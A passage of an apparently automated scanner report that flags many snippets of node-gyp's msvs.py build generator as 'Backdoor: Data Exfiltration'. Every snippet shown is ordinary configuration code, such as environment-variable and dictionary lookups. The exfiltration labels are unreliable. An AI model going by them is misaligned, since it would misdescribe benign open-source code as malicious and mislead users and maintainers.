                      "markdown": "`\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2940,
                  "startColumn": 18,
                  "endLine": 2940,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    ]\n\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n",
                    "rendered": {
                      "text": "    ]\n\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n",
                      "markdown": "`    ]\n\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2898,
                  "startColumn": 23,
                  "endLine": 2898,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\ndef _GetConfigurationAndPlatform(name, settings, spec):\n    configuration = name.rsplit(\"_\", 1)[0]\n    platform = settings.get(\"msvs_configuration_platform\", \"Win32\")\n    if spec[\"toolset\"] == \"host\" and platform == \"arm64\":\n        platform = \"x64\"  # Host-only tools are always built for x64\n    return (configuration, platform)\n",
                    "rendered": {
                      "text": "\ndef _GetConfigurationAndPlatform(name, settings, spec):\n    configuration = name.rsplit(\"_\", 1)[0]\n    platform = settings.get(\"msvs_configuration_platform\", \"Win32\")\n    if spec[\"toolset\"] == \"host\" and platform == \"arm64\":\n        platform = \"x64\"  # Host-only tools are always built for x64\n    return (configuration, platform)\n",
                      "markdown": "`\ndef _GetConfigurationAndPlatform(name, settings, spec):\n    configuration = name.rsplit(\"_\", 1)[0]\n    platform = settings.get(\"msvs_configuration_platform\", \"Win32\")\n    if spec[\"toolset\"] == \"host\" and platform == \"arm64\":\n        platform = \"x64\"  # Host-only tools are always built for x64\n    return (configuration, platform)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2418,
                  "startColumn": 36,
                  "endLine": 2418,
                  "endColumn": 41,
                  "snippet": {
                    "text": "                for i in old_additional_dependencies\n            ]\n        )\n        old_outputs = _FixPaths(rule.get(\"outputs\", []))\n        self.outputs = \";\".join(\n            [MSVSSettings.ConvertVCMacrosToMSBuild(i) for i in old_outputs]\n        )\n",
                    "rendered": {
                      "text": "                for i in old_additional_dependencies\n            ]\n        )\n        old_outputs = _FixPaths(rule.get(\"outputs\", []))\n        self.outputs = \";\".join(\n            [MSVSSettings.ConvertVCMacrosToMSBuild(i) for i in old_outputs]\n        )\n",
                      "markdown": "`                for i in old_additional_dependencies\n            ]\n        )\n        old_outputs = _FixPaths(rule.get(\"outputs\", []))\n        self.outputs = \";\".join(\n            [MSVSSettings.ConvertVCMacrosToMSBuild(i) for i in old_outputs]\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2411,
                  "startColumn": 52,
                  "endLine": 2411,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        self.description = MSVSSettings.ConvertVCMacrosToMSBuild(\n            rule.get(\"message\", self.rule_name)\n        )\n        old_additional_dependencies = _FixPaths(rule.get(\"inputs\", []))\n        self.additional_dependencies = \";\".join(\n            [\n                MSVSSettings.ConvertVCMacrosToMSBuild(i)\n",
                    "rendered": {
                      "text": "        self.description = MSVSSettings.ConvertVCMacrosToMSBuild(\n            rule.get(\"message\", self.rule_name)\n        )\n        old_additional_dependencies = _FixPaths(rule.get(\"inputs\", []))\n        self.additional_dependencies = \";\".join(\n            [\n                MSVSSettings.ConvertVCMacrosToMSBuild(i)\n",
                      "markdown": "`        self.description = MSVSSettings.ConvertVCMacrosToMSBuild(\n            rule.get(\"message\", self.rule_name)\n        )\n        old_additional_dependencies = _FixPaths(rule.get(\"inputs\", []))\n        self.additional_dependencies = \";\".join(\n            [\n                MSVSSettings.ConvertVCMacrosToMSBuild(i)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2409,
                  "startColumn": 16,
                  "endLine": 2409,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            self.extension = \".\" + self.extension\n\n        self.description = MSVSSettings.ConvertVCMacrosToMSBuild(\n            rule.get(\"message\", self.rule_name)\n        )\n        old_additional_dependencies = _FixPaths(rule.get(\"inputs\", []))\n        self.additional_dependencies = \";\".join(\n",
                    "rendered": {
                      "text": "            self.extension = \".\" + self.extension\n\n        self.description = MSVSSettings.ConvertVCMacrosToMSBuild(\n            rule.get(\"message\", self.rule_name)\n        )\n        old_additional_dependencies = _FixPaths(rule.get(\"inputs\", []))\n        self.additional_dependencies = \";\".join(\n",
                      "markdown": "`            self.extension = \".\" + self.extension\n\n        self.description = MSVSSettings.ConvertVCMacrosToMSBuild(\n            rule.get(\"message\", self.rule_name)\n        )\n        old_additional_dependencies = _FixPaths(rule.get(\"inputs\", []))\n        self.additional_dependencies = \";\".join(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2339,
                  "startColumn": 44,
                  "endLine": 2339,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    msbuild_rules = []\n    for rule in rules_native:\n        # Skip a rule with no action and no inputs.\n        if \"action\" not in rule and not rule.get(\"rule_sources\", []):\n            continue\n        msbuild_rule = MSBuildRule(rule, spec)\n        msbuild_rules.append(msbuild_rule)\n",
                    "rendered": {
                      "text": "    msbuild_rules = []\n    for rule in rules_native:\n        # Skip a rule with no action and no inputs.\n        if \"action\" not in rule and not rule.get(\"rule_sources\", []):\n            continue\n        msbuild_rule = MSBuildRule(rule, spec)\n        msbuild_rules.append(msbuild_rule)\n",
                      "markdown": "`    msbuild_rules = []\n    for rule in rules_native:\n        # Skip a rule with no action and no inputs.\n        if \"action\" not in rule and not rule.get(\"rule_sources\", []):\n            continue\n        msbuild_rule = MSBuildRule(rule, spec)\n        msbuild_rules.append(msbuild_rule)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2334,
                  "startColumn": 47,
                  "endLine": 2334,
                  "endColumn": 52,
                  "snippet": {
                    "text": "    # https://devblogs.microsoft.com/cppblog/quick-help-on-vs2010-custom-build-rule/\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n    msbuild_rules = []\n    for rule in rules_native:\n",
                    "rendered": {
                      "text": "    # https://devblogs.microsoft.com/cppblog/quick-help-on-vs2010-custom-build-rule/\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n    msbuild_rules = []\n    for rule in rules_native:\n",
                      "markdown": "`    # https://devblogs.microsoft.com/cppblog/quick-help-on-vs2010-custom-build-rule/\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n    msbuild_rules = []\n    for rule in rules_native:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2333,
                  "startColumn": 49,
                  "endLine": 2333,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    # For more details see:\n    # https://devblogs.microsoft.com/cppblog/quick-help-on-vs2010-custom-build-rule/\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n    msbuild_rules = []\n",
                    "rendered": {
                      "text": "    # For more details see:\n    # https://devblogs.microsoft.com/cppblog/quick-help-on-vs2010-custom-build-rule/\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n    msbuild_rules = []\n",
                      "markdown": "`    # For more details see:\n    # https://devblogs.microsoft.com/cppblog/quick-help-on-vs2010-custom-build-rule/\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n    msbuild_rules = []\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2332,
                  "startColumn": 16,
                  "endLine": 2332,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    # file and a .props file.\n    # For more details see:\n    # https://devblogs.microsoft.com/cppblog/quick-help-on-vs2010-custom-build-rule/\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n",
                    "rendered": {
                      "text": "    # file and a .props file.\n    # For more details see:\n    # https://devblogs.microsoft.com/cppblog/quick-help-on-vs2010-custom-build-rule/\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n",
                      "markdown": "`    # file and a .props file.\n    # For more details see:\n    # https://devblogs.microsoft.com/cppblog/quick-help-on-vs2010-custom-build-rule/\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2163,
                  "startColumn": 26,
                  "endLine": 2163,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n    if missing_sources:\n        error_message = \"Missing input files:\\n\" + \"\\n\".join(set(missing_sources))\n        if generator_flags.get(\"msvs_error_on_missing_sources\", False):\n            raise GypError(error_message)\n        else:\n            print(\"Warning: \" + error_message, file=sys.stdout)\n",
                    "rendered": {
                      "text": "\n    if missing_sources:\n        error_message = \"Missing input files:\\n\" + \"\\n\".join(set(missing_sources))\n        if generator_flags.get(\"msvs_error_on_missing_sources\", False):\n            raise GypError(error_message)\n        else:\n            print(\"Warning: \" + error_message, file=sys.stdout)\n",
                      "markdown": "`\n    if missing_sources:\n        error_message = \"Missing input files:\\n\" + \"\\n\".join(set(missing_sources))\n        if generator_flags.get(\"msvs_error_on_missing_sources\", False):\n            raise GypError(error_message)\n        else:\n            print(\"Warning: \" + error_message, file=sys.stdout)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2106,
                  "startColumn": 13,
                  "endLine": 2106,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    )\n\n    # Optionally configure each spec to use ninja as the external builder.\n    if params.get(\"flavor\") == \"ninja\":\n        _InitNinjaFlavor(params, target_list, target_dicts)\n\n    # Prepare the set of configurations.\n",
                    "rendered": {
                      "text": "    )\n\n    # Optionally configure each spec to use ninja as the external builder.\n    if params.get(\"flavor\") == \"ninja\":\n        _InitNinjaFlavor(params, target_list, target_dicts)\n\n    # Prepare the set of configurations.\n",
                      "markdown": "`    )\n\n    # Optionally configure each spec to use ninja as the external builder.\n    if params.get(\"flavor\") == \"ninja\":\n        _InitNinjaFlavor(params, target_list, target_dicts)\n\n    # Prepare the set of configurations.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2094,
                  "startColumn": 28,
                  "endLine": 2094,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    # GeneratorCalculatedVariables.\n    msvs_version = params[\"msvs_version\"]\n\n    generator_flags = params.get(\"generator_flags\", {})\n\n    # Optionally shard targets marked with 'msvs_shard': SHARD_COUNT.\n    (target_list, target_dicts) = MSVSUtil.ShardTargets(target_list, target_dicts)\n",
                    "rendered": {
                      "text": "    # GeneratorCalculatedVariables.\n    msvs_version = params[\"msvs_version\"]\n\n    generator_flags = params.get(\"generator_flags\", {})\n\n    # Optionally shard targets marked with 'msvs_shard': SHARD_COUNT.\n    (target_list, target_dicts) = MSVSUtil.ShardTargets(target_list, target_dicts)\n",
                      "markdown": "`    # GeneratorCalculatedVariables.\n    msvs_version = params[\"msvs_version\"]\n\n    generator_flags = params.get(\"generator_flags\", {})\n\n    # Optionally shard targets marked with 'msvs_shard': SHARD_COUNT.\n    (target_list, target_dicts) = MSVSUtil.ShardTargets(target_list, target_dicts)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2060,
                  "startColumn": 13,
                  "endLine": 2060,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n\ndef CalculateGeneratorInputInfo(params):\n    if params.get(\"flavor\") == \"ninja\":\n        toplevel = params[\"options\"].toplevel_dir\n        qualified_out_dir = os.path.normpath(\n            os.path.join(\n",
                    "rendered": {
                      "text": "\n\ndef CalculateGeneratorInputInfo(params):\n    if params.get(\"flavor\") == \"ninja\":\n        toplevel = params[\"options\"].toplevel_dir\n        qualified_out_dir = os.path.normpath(\n            os.path.join(\n",
                      "markdown": "`\n\ndef CalculateGeneratorInputInfo(params):\n    if params.get(\"flavor\") == \"ninja\":\n        toplevel = params[\"options\"].toplevel_dir\n        qualified_out_dir = os.path.normpath(\n            os.path.join(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2030,
                  "startColumn": 21,
                  "endLine": 2030,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    # contains the actual word size of the system when running thru WOW64).\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\").find(\"64\") >= 0\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\", \"\").find(\"64\") >= 0\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n    else:\n",
                    "rendered": {
                      "text": "    # contains the actual word size of the system when running thru WOW64).\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\").find(\"64\") >= 0\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\", \"\").find(\"64\") >= 0\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n    else:\n",
                      "markdown": "`    # contains the actual word size of the system when running thru WOW64).\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\").find(\"64\") >= 0\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\", \"\").find(\"64\") >= 0\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2029,
                  "startColumn": 18,
                  "endLine": 2029,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    # process), it is also necessary to check PROCESSOR_ARCITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\").find(\"64\") >= 0\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\", \"\").find(\"64\") >= 0\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n",
                    "rendered": {
                      "text": "    # process), it is also necessary to check PROCESSOR_ARCITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\").find(\"64\") >= 0\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\", \"\").find(\"64\") >= 0\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n",
                      "markdown": "`    # process), it is also necessary to check PROCESSOR_ARCITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\").find(\"64\") >= 0\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\", \"\").find(\"64\") >= 0\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2016,
                  "startColumn": 23,
                  "endLine": 2016,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n    # Select project file format version (if unset, default to auto detecting).\n    msvs_version = MSVSVersion.SelectVisualStudioVersion(\n        generator_flags.get(\"msvs_version\", \"auto\")\n    )\n    # Stash msvs_version for later (so we don't have to probe the system twice).\n    params[\"msvs_version\"] = msvs_version\n",
                    "rendered": {
                      "text": "\n    # Select project file format version (if unset, default to auto detecting).\n    msvs_version = MSVSVersion.SelectVisualStudioVersion(\n        generator_flags.get(\"msvs_version\", \"auto\")\n    )\n    # Stash msvs_version for later (so we don't have to probe the system twice).\n    params[\"msvs_version\"] = msvs_version\n",
                      "markdown": "`\n    # Select project file format version (if unset, default to auto detecting).\n    msvs_version = MSVSVersion.SelectVisualStudioVersion(\n        generator_flags.get(\"msvs_version\", \"auto\")\n    )\n    # Stash msvs_version for later (so we don't have to probe the system twice).\n    params[\"msvs_version\"] = msvs_version\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2012,
                  "startColumn": 28,
                  "endLine": 2012,
                  "endColumn": 33,
                  "snippet": {
                    "text": "def CalculateVariables(default_variables, params):\n    \"\"\"Generated variables that require params to be known.\"\"\"\n\n    generator_flags = params.get(\"generator_flags\", {})\n\n    # Select project file format version (if unset, default to auto detecting).\n    msvs_version = MSVSVersion.SelectVisualStudioVersion(\n",
                    "rendered": {
                      "text": "def CalculateVariables(default_variables, params):\n    \"\"\"Generated variables that require params to be known.\"\"\"\n\n    generator_flags = params.get(\"generator_flags\", {})\n\n    # Select project file format version (if unset, default to auto detecting).\n    msvs_version = MSVSVersion.SelectVisualStudioVersion(\n",
                      "markdown": "`def CalculateVariables(default_variables, params):\n    \"\"\"Generated variables that require params to be known.\"\"\"\n\n    generator_flags = params.get(\"generator_flags\", {})\n\n    # Select project file format version (if unset, default to auto detecting).\n    msvs_version = MSVSVersion.SelectVisualStudioVersion(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1999,
                  "startColumn": 19,
                  "endLine": 1999,
                  "endColumn": 24,
                  "snippet": {
                    "text": "                \"$(OutDir)\",\n                \"$(ProjectName)\",\n            ]\n        if not spec.get(\"msvs_external_builder_clean_cmd\"):\n            spec[\"msvs_external_builder_clean_cmd\"] = [\n                path_to_ninja,\n                \"-C\",\n",
                    "rendered": {
                      "text": "                \"$(OutDir)\",\n                \"$(ProjectName)\",\n            ]\n        if not spec.get(\"msvs_external_builder_clean_cmd\"):\n            spec[\"msvs_external_builder_clean_cmd\"] = [\n                path_to_ninja,\n                \"-C\",\n",
                      "markdown": "`                \"$(OutDir)\",\n                \"$(ProjectName)\",\n            ]\n        if not spec.get(\"msvs_external_builder_clean_cmd\"):\n            spec[\"msvs_external_builder_clean_cmd\"] = [\n                path_to_ninja,\n                \"-C\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1992,
                  "startColumn": 19,
                  "endLine": 1992,
                  "endColumn": 24,
                  "snippet": {
                    "text": "                ninja_generator.ComputeOutputDir(params),\n                configuration,\n            )\n        if not spec.get(\"msvs_external_builder_build_cmd\"):\n            spec[\"msvs_external_builder_build_cmd\"] = [\n                path_to_ninja,\n                \"-C\",\n",
                    "rendered": {
                      "text": "                ninja_generator.ComputeOutputDir(params),\n                configuration,\n            )\n        if not spec.get(\"msvs_external_builder_build_cmd\"):\n            spec[\"msvs_external_builder_build_cmd\"] = [\n                path_to_ninja,\n                \"-C\",\n",
                      "markdown": "`                ninja_generator.ComputeOutputDir(params),\n                configuration,\n            )\n        if not spec.get(\"msvs_external_builder_build_cmd\"):\n            spec[\"msvs_external_builder_build_cmd\"] = [\n                path_to_ninja,\n                \"-C\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1985,
                  "startColumn": 21,
                  "endLine": 1985,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            configuration = \"$(Configuration)\"\n            if params.get(\"target_arch\") == \"x64\":\n                configuration += \"_x64\"\n            if params.get(\"target_arch\") == \"arm64\":\n                configuration += \"_arm64\"\n            spec[\"msvs_external_builder_out_dir\"] = os.path.join(\n                gyp.common.RelativePath(params[\"options\"].toplevel_dir, gyp_dir),\n",
                    "rendered": {
                      "text": "            configuration = \"$(Configuration)\"\n            if params.get(\"target_arch\") == \"x64\":\n                configuration += \"_x64\"\n            if params.get(\"target_arch\") == \"arm64\":\n                configuration += \"_arm64\"\n            spec[\"msvs_external_builder_out_dir\"] = os.path.join(\n                gyp.common.RelativePath(params[\"options\"].toplevel_dir, gyp_dir),\n",
